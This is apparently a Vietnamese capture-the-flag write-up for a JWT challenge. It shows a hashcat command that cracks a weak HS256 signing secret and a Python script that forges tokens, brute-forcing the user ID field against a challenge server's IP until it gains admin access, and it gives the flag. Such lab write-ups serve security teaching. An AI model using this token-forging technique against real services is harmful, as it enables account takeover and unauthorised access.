<h1>JWT Attack</h1>

Trước tiên, login vào tài khoản đã được đăng ký.

![](./img/1.png)

Để ý phần cookie trong http request, nhận thấy đây là JWT 

![](./img/2.png)

decode JWT ta có
```
header = {
    "typ": "JWT",
    "alg": "HS256"
}
payload = {
    "fresh": false,
    "iat": 1689958264,
    "jti": "a495f879-7075-4a39-a4b5-bd4e74322e0b",
    "type": "access",
    "sub": 6028,
    "nbf": 1689958264,
    "exp": 1689959164
}
```
Như vậy token được encrypted bởi <b>HS256</b>

Sau khi tạo vài tài khoản và submit nhiều lần, tôi nhận ra trường <b>sub</b> trong payload có giá trị không đổi đối với mỗi tài khoản và trong mọi phiên làm việc. Có thể server dựa vào trường này để xác định người dùng, có thể BruteForce trường này để lấy được <b>admin</b>.

Nhưng để thay đổi được token, ta cần biết <b>private key</b> của server.

```powershell
hashcat -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4OTk1ODI2NCwianRpIjoiYTQ5NWY4NzktNzA3NS00YTM5LWE0YjUtYmQ0ZTc0MzIyZTBiIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6NjAyOCwibmJmIjoxNjg5OTU4MjY0LCJleHAiOjE2ODk5NTkxNjR9.l4iMKyKTQGDnuxHxdqoyxtJIF25Kyh7myJxw8EFUS5k /home/ngnisp/wordlist/jwt.secrets.list.txt
```
![](./img/3.png)

May mắn là private_key yếu nên nó đã bị tìm ra
```
private_key: this_is_a_dev_secret
```
Tiếp theo BruteForce trường <b>Sub</b> trong payload như đã nói ở trên, Encrypt nó vào gửi lên server. Mã 200 là đúng, 401 là sai.

```python
import requests
import jwt

burp0_url = "http://45.56.116.251:5050/profile"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://45.56.116.251:5050/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "vi,en-US;q=0.9,en;q=0.8", "Connection": "close"}

def create_jwt(payload, secret_key):
    header = {"typ": "JWT", "alg": "HS256"}
    jwt_token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
    return jwt_token

for _ in range(10000):  
    payload_data = {
                    "fresh": False,
                    "iat": 1689960056,
                    "jti": "51156053-531f-4fe9-a133-ffaece1ef987",
                    "type": "access",
                    "sub": _,
                    "nbf": 1689960056,
                    "exp": 1689960956
                    }
    secret_key = "this_is_a_dev_secret"

    jwt_token = create_jwt(payload_data, secret_key)
    burp0_cookies = {"access_token_cookie": jwt_token}
    res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print(res.status_code)
    if res.status_code == 200:
        print(f"[::]Found {jwt_token}")
```

### Giải thích code
Tăng giá trị của Sub từ 1->10000 và encrypt với private_key. Server Decrypt token và check nếu <b>sub = Giá trị của bất kể user nào</b> sẽ trả lại mã 200, và in ra token. 

Nhưng thật không ngờ chỉ đến request thứ 2, tức là <b>Sub = 2</b> đã có được admin. Biết thế đã không code scrupt :<

![](./img/4.png)

Đem token tìm được submit lại, lấy được flag:

![](./img/5.png)

```
Flag: BDSEC{m4k3_y0ur_53cr37_k3y_57r0n63r}
```